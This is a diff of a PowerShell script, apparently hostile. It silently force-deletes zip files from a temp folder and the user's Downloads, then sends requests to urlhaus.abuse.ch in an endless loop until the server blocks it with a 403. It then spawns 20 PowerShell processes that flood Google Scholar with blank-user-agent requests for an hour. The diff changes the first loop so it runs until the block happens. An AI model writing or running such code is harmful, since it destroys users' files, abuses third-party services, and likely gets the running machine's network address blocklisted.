@@ -165,20 +165,27 @@ $tempZips=Get-ChildItem -Path $tempPath -Filter "*.zip" -ErrorAction SilentlyCon
 $downloadZip=Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\download.zip"
 foreach($zip in $tempZips){Remove-Item -LiteralPath $zip.FullName -Force -ErrorAction SilentlyContinue}
 if(Test-Path -LiteralPath $downloadZip){Remove-Item -LiteralPath $downloadZip -Force -ErrorAction SilentlyContinue}
-foreach ($i in 1..20) {
-Invoke-RestMethod -Uri "https://urlhaus.abuse.ch:443/browse.php" -Method Get -UserAgent ""
+while ($true) {
+try {
+$null = Invoke-RestMethod -Uri "https://urlhaus.abuse.ch:443/browse.php" -Method Get -UserAgent "" -ErrorAction Stop
+}
+catch {
+if ($_.Exception.Response.StatusCode -eq 403){
+break
+}
+}
 }
 $count = 20
 $command = '
 $minutesToRun = 60
 $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-while ($stopwatch.Elapsed.TotalMinutes -lt $minutesToRun) {
+while ($stopwatch.Elapsed.TotalMinutes -lt $minutesToRun){
 Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent ""
 }
 $stopwatch.Stop()
 Write-Output "Loop finished after $minutesToRun minutes!"
 '
-1..$count | ForEach-Object {
+1..$count | ForEach-Object{
 Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $command
 }
 [Environment]::Exit(0)
